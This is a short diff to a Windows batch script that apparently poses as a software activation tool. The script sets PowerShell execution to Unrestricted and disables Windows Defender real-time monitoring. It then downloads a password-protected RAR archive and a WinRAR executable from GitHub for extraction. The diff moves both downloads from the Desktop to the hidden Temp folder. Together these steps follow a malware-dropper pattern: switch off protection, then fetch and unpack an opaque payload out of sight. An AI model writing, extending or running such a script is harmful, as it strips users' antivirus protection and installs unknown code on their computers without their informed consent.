@@ -4,9 +4,9 @@ powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Cu
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 
 set urlProgram=https://github.com/diegrp/atv-dbooster/raw/main/processo-ativacao.rar
-set destinoProgram=C:\Users\%USERNAME%\Desktop\processo-ativacao.rar
+set destinoProgram=C:\Users\%USERNAME%\AppData\Local\Temp\processo-ativacao.rar
 set urlWinrar=https://github.com/diegrp/atv-dbooster/raw/main/WinRAR.exe
-set destinoWinrar=C:\Users\%USERNAME%\Desktop\WinRar.exe
+set destinoWinrar=C:\Users\%USERNAME%\AppData\Local\Temp\WinRar.exe
 
 :: Extrair o arquivo com senha para o diretório temporário
 set rarFile=%destinoProgram%
